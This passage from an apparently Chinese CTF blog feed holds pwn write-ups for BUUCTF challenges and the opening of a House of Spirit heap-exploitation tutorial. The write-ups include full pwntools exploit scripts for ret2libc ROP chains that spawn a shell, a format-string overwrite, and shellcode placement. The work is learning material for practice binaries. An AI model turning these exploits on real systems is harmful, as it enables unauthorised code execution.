class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，这里会根据输入字符串长度对字符串进行加密，只是简单的异或，可以自己写一个异或加密函数把payload加密一下。<br>这里更方便的是利用strlen函数的特点：<strong>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。**，在payload开始处填充’\x00’使strlen函数返回值为</strong>0**，从而绕过加密<br>ret2libc题目，没有system和’/bin/sh’,而且PIE是关闭的，我们可以泄露puts函数的got表项，再根据其与libc中的偏移计算得到system和/bin/sh的地址。<br>由于是64位程序，需要向rdi寄存器传入函数参数，用ROP_gadget找一些gadget:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span> | grep rdi</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>一些解释和汇编角度来理解payload执行的思路放在exp里面吧，不得不说学汇编真的是重要<br>贴一下ret指令的作用：</p><ul><li>sp增加一个内存单元</li><li>栈顶数据出栈赋值给ip寄存器</li></ul><p>还有使用ret的原因：<a href="http://blog.eonew.cn/archives/958">在一些64位的glibc的payload调用system函数失败问题</a><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;29858&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里函数ret的时候会把栈提高一个内存单元，也就是ebp+0x8，然后pop，rdi_addr进入eip寄存器后，esp+0x8，也就是到了</span></span><br><span class="line"><span class="comment"># puts_got的位置，然后eip执行指令就可以把参数传入rdi了，pop rdi完了esp再抬0x8到puts_plt的位置，执行ret,相当于调用puts_plt，</span></span><br><span class="line"><span class="comment"># 就可以打印出got表项了</span></span><br><span class="line">payload = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要接收两次，第一次把 **puts(&quot;Ciphertext&quot;);**里的接收掉</span></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里要用ret对齐</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\0&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) + p64(ret)+p64(rdi_addr) + p64(binsh_addr) + p64(system_addr) + p64(main)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x6-OGeek2019-babyrop"><a href="#0x6-OGeek2019-babyrop" class="headerlink" title="0x6 [OGeek2019]babyrop"></a>0x6 [OGeek2019]babyrop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随机数可以不用管，重点在这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);                     <span class="comment">// 存在溢出，buf紧挨着v5，可以修改v5的值大于127</span></span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )                   <span class="comment">// &#x27;\x00&#x27;开头来绕过strncmp</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在这里实现retlibc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1);  <span class="comment">//溢出</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;26338&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./[OGeek2019]babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x08048825</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">6</span> + <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(<span class="number">0xdeafbeef</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x7-第五空间2019-决赛-PWN5"><a href="#0x7-第五空间2019-决赛-PWN5" class="headerlink" title="0x7 [第五空间2019 决赛]PWN5"></a>0x7 [第五空间2019 决赛]PWN5</h2><p>程序伪码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// et1</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+4h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;a1;</span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = v5 ^ v8;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != v8 )</span><br><span class="line">    sub_80493D0(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>格式化字符串，先看一下输入的aaaa在栈上位置的偏移量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwn5</span><br><span class="line">your name:aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</span><br><span class="line">Hello,aaaa0xffdfa508.0x63.(nil).0xf7f31a9c.0x3.0xf7f03410.0x1.(nil).0x1.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.</span><br><span class="line">����your passwd:</span><br></pre></td></tr></table></figure><p>可以看到在第10个的位置，可以利用格式化字符串将指定数值写到指定地址，payload一般构造如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...[overwrite addr]....%[overwrite offset]$n</span><br></pre></td></tr></table></figure><p>这样可以将全局变量改写为4，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,&#x27;26236&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn5&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x0804C044</span></span><br><span class="line"><span class="comment"># 随机数被修改为4，p32为4位</span></span><br><span class="line">payload = p32(fd) + <span class="string">&#x27;%10$n&#x27;</span> </span><br><span class="line">p.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x8-get-started-3dsctf-2016"><a href="#0x8-get-started-3dsctf-2016" class="headerlink" title="0x8 get_started_3dsctf_2016"></a>0x8 get_started_3dsctf_2016</h2><p>这篇写过详细的<a href="https://iceyup.xyz/2021/01/25/get_started_3dsctf_2016/">writeup</a></p><h2 id="0x9-ciscn-2019-en-2"><a href="#0x9-ciscn-2019-en-2" class="headerlink" title="0x9 ciscn_2019_en_2"></a>0x9 ciscn_2019_en_2</h2><p>解法同 ciscn_2019_c_1</p><h2 id="0xa"><a href="#0xa" class="headerlink" title="0xa"></a>0xa</h2><p>剩下的后面争取一天补一篇，还有就是堆要继续学，勤写博客，题争取时间多刷</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上学期和寒假刷了一些题，但是因为懒没有全部记录下，现在分几篇博客慢慢补上，也当作回顾&lt;br&gt;这篇的题应该都是很基础的，不详细写（偷懒）&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="BUUCTF" scheme="http://example.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit学习</title>
    <link href="http://example.com/2021/03/20/House%20of%20Spirit%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/03/20/House%20of%20Spirit%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-03-20T06:49:00.000Z</published>
    <updated>2021-03-28T08:26:53.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>House of Spirit是组合型的漏洞利用，它是指针覆盖和堆管理机制的组合利用。该技术的核心在于在目标位置处伪造fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的chunk的目的。<br>要构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表中，需要绕过一些必要的检测，即：</p><ul><li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <strong>2 * SIZE_SZ</strong>，同时也不能大于<strong>av-&gt;system_mem</strong> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><hr><h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><ul><li>想要利用的目标区域的前段空间和后段空间都是可控的区域。<strong>一般来说想要控制的区域多为返回地址或函数指针，正常情况下，该内存区域我们是无法通过输入数据来进行控制的，为了利用hos技术来改写该区域，我们需要前段空间和后段空间均可控。</strong></li><li>存在堆变量指针覆盖指向可控区域</li></ul><table><thead><tr><th>HOS</th></tr></thead><tbody><tr><td>前段空间</td></tr><tr><td><strong>目标区域</strong></td></tr><tr><td>后段空间</td></tr></tbody></table><hr><h1 id="例题：lctf-2016-pwn200"><a href="#例题：lctf-2016-pwn200" class="headerlink" title="例题：lctf_2016_pwn200"></a>例题：lctf_2016_pwn200</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/checksec.png"><br>关闭了栈不可执行，可以写入shellcode。</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><h3 id="welcome函数"><a href="#welcome函数" class="headerlink" title="welcome函数"></a>welcome函数</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/welcome.png"><br>这里存在off-by-one漏洞，如果输入48个字符，printf不会检测到 <strong>\x00</strong> 的存在，而v2紧接着就是rbp，可以泄露rbp地址。</p><h3 id="input-money-and-menu函数"><a href="#input-money-and-menu函数" class="headerlink" title="input_money_and_menu函数"></a>input_money_and_menu函数</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/moneyR.png"><br>先申请0x40大小的内存空间，并将malloc指针赋给dest；再向缓冲区读入内容，并将内容复制到dest指向的内存中，最后将dest指针赋给全局变量ptr。<br>这里buf和dest存在<strong>相邻变量覆盖</strong>，输入buf的内容会将dest覆盖掉。如下图所示：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/buf_and_dest7.png"></p><h3 id="heap-management函数"><a href="#heap-management函数" class="headerlink" title="heap_management函数"></a>heap_management函数</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/heap_mana.png"></p><ul><li>1.check in</li><li>2.check out</li><li>3.goodbye</li></ul><h4 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h4><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/in.png"><br>会先检查ptr是否为空，如果不为空，会根据输入的大小和内容创建一个新的堆块</p><h4 id="check-out"><a href="#check-out" class="headerlink" title="check out"></a>check out</h4><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/out.png"><br>释放堆块并置NULL</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="栈帧的具体情况如下："><a href="#栈帧的具体情况如下：" class="headerlink" title="栈帧的具体情况如下："></a>栈帧的具体情况如下：</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>input_money_and_menu栈帧</strong></td><td><strong>buf</strong></td></tr><tr><td></td><td><strong>buf</strong></td></tr><tr><td></td><td><strong>dest</strong></td></tr><tr><td></td><td><strong>old rbp</strong></td></tr><tr><td><strong>welcome栈帧</strong></td><td><strong>input_money_and_menu ret</strong></td></tr><tr><td></td><td>……</td></tr><tr><td></td><td><strong>id</strong></td></tr><tr><td></td><td><strong>v2(name)</strong></td></tr><tr><td></td><td><strong>old rbp</strong></td></tr><tr><td><strong>main栈帧</strong></td><td><strong>welcome ret</strong></td></tr><tr><td></td><td><strong>…</strong></td></tr><tr><td></td><td><strong>old rbp</strong></td></tr><tr><td><strong>start栈帧</strong></td><td><strong>main ret</strong></td></tr></tbody></table><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>在输入name的时候，将shellcode部署在name的位置，并调整好填充大小，以便泄露rbp地址</li><li>得到rbp地址后可以得到栈上的地址，shellcode和fake_chunk的地址就可以根据偏移得到</li><li>在输入buf的时候部署好fake chunk，同时注意绕过条件，并利用相邻地址覆盖将dest覆盖为fake chunk的地址，这样ptr也指向了fake chunk。这里fake chunk的大小要包括rbp和<strong>input_money_and_menu ret</strong>，方便后续修改</li><li>check out释放fake chunk，然后check in申请一个堆块，这样rbp和<strong>input_money_and_menu ret</strong>就可以为我们所用了，将shellcode addr写入ret，退出程序时就可以<strong>getshell</strong></li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ru(<span class="string">&#x27;who are u?\n&#x27;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>)</span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span 